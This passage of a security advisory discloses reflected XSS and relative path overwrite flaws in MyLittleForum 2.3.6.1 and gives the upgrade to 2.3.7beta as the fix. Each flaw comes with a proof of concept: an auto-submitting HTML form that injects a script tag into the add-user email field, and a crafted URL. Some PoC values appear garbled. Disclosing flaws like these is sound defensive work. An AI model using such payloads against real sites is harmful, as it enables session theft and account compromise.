2. Overview

MyLittleForum is forum software written in PHP. In version 2.3.6.1, it is
vulnerable to reflected cross site scripting as well as relative path
overwrite. XSS can be used to steal cookies, inject JavaScript keyloggers, or
bypass CSRF protection, and RPO may lead to CSS injection.

3. Details

Reflected XSS

CVSS: Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N

Description: The username and email parameter of the add user page are
vulnerable to reflected XSS.

Proof of Concept:

<html> <body> <form action="http://localhost/mylittleforum-2.3.6.1/index.php"
method="POST"> <input type="hidden" name="mode" value="admin" /> <input type=
"hidden" name="ar_username" value="test" /> <input type="hidden" name=
"ar_email" value="test@...mple.comle3d4"><script>alert(1)</script>" /> <input
type="hidden" name="ar_pw" value="test" /> <input type="hidden" name=
"ar_pw_conf" value="test" /> <input type="hidden" name="register_submit" value=
"� OK� " /> <input type="submit" value="Submit request" /> </form> </body> </
html>

Relative Path Overwrite

Description: Because the application includes CSS files relative instead of
absolute, an attacker can overwrite the path. With some browsers, this may lead
to CSS injection.

Proof of Concept:

http://localhost/mylittleforum-2.3.6.1/index.php////?id=1

4. Solution

To mitigate this issue please upgrade at least to version 2.3.7beta:

https://github.com/ilosuna/mylittleforum/releases/tag/v2.3.7beta

Please note that a newer version might already be available.
